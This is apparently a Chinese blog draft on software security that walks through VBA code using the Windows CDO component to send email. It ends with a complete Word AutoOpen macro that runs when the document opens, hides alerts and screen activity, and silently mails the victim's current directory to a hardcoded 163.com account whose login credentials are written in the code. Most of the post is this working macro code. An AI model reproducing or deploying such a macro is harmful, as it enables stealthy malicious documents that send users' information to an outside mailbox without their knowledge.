---
title: 'CDO组件发送邮件'
date: 2019-01-01
category: '软件安全'
tags: []
lang: 'zh'
draft: true
---
分析一下dalao的代码

关键代码

# 获取一个shell
`Set ws = CreateObject("WScript.Shell")`

# 得到当前目录
`TestBody = ws.CurrentDirectory`

# 得到CDO对象
`Set cdoMail = CreateObject("CDO.message")`

# 同时给它一个基本设置

`Set cdoConf = CreateObject("CDO.Configuration")`

# 收发件人主题等
```vb
cdoMail.From = From
cdoMail.To = Reciever
cdoMail.Subject = TestSubject
```

# 一堆设置

```vb
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.163.com"   '服务器
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465  ‘端口号
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  ’认证码？
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "邮箱账号"
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "邮箱密码"
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout") = 60  ‘超时时间
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True   
```

# 收尾

```vb
Set cdoMail.Configuration = cdoConf
cdoMail.Fields.Item("urn:schemas:mailheader:X-MSMail-Priority") = "High"
cdoMail.Fields.Item("urn:schemas:mailheader:X-Priority") = 2
cdoMail.Fields.Item("urn:schemas:httpmail:importance") = 2
cdoMail.Fields.Update
cdoMail.Send
Set cdoMail = Nothing
Set cdoConf = Nothing

```

然而失败了？

我好像明白了， 昨天我用的邮箱账号和， 密码其实是授权码

```
Sub AutoOpen()
'
' path 宏
'
'
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Options.SaveNormalPrompt = False
Application.ScreenUpdating = False
From = "abc156728@163.com"
Reciever = "abc156728@163.com"
Set ws = CreateObject("WScript.Shell")
TestBody = ws.CurrentDirectory
TestSubject = "lalalalaala"
Dim objOutlook, Client, Mail
Set cdoMail = CreateObject("CDO.message")
Set cdoConf = CreateObject("CDO.Configuration")
cdoMail.From = From
cdoMail.To = Reciever
cdoMail.Subject = TestSubject
cdoMail.HTMLbody = "<html><body>" & TestBody & "</body></html>"

cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.163.com"
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "abc156728@163.com"
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "156728"
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout") = 60
cdoConf.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
cdoConf.Fields.Update
Set cdoMail.Configuration = cdoConf
cdoMail.Fields.Item("urn:schemas:mailheader:X-MSMail-Priority") = "High"
cdoMail.Fields.Item("urn:schemas:mailheader:X-Priority") = 2
cdoMail.Fields.Item("urn:schemas:httpmail:importance") = 2
cdoMail.Fields.Update
cdoMail.Send
Set cdoMail = Nothing
Set cdoConf = Nothing

End Sub

```

最后的代码
